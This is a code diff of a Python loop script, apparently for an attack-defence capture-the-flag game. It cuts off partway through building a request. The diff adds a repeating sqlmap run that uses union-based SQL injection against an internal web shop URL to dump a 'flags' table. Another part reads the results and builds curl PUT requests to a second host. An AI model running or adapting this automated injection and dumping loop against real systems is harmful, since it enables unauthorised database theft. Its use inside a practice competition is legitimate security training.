@@ -3,16 +3,18 @@ from time import sleep
 
     
 while True:
-    # try:
-    #     p = subprocess.Popen("python3 s.py", shell=True)
-    #     sleep(60)  
-    # except:
-    #     print("error get flag")
-    #     sleep(30)     
+    try:
+        p = subprocess.Popen("""python3 /home/ubuntu/sqlmap-dev/sqlmap.py -u "http://10.254.1.2:4001/index.php?page=shop&type=VGA" --technique=U -D vstore -T flags --dump --batch > temp_web.txt""", shell=True)
+        sleep(5)  
+    except:
+        print("error get flag")
+        sleep(5)   
+
+
     with open("web.txt","r") as f:
         lines=f.readlines()
         for line in lines:
-            line=line.replace('\n','').strip()
+            line=line.replace('|','').replace('\n','').strip()
             try:
                 if len(line)>0 :
                     cmd_query=f"""curl -i -s -k -X PUT -H 'Host: 10.254.0.253:8080' -H 'Accept-Encoding: gzip, deflate' """ \
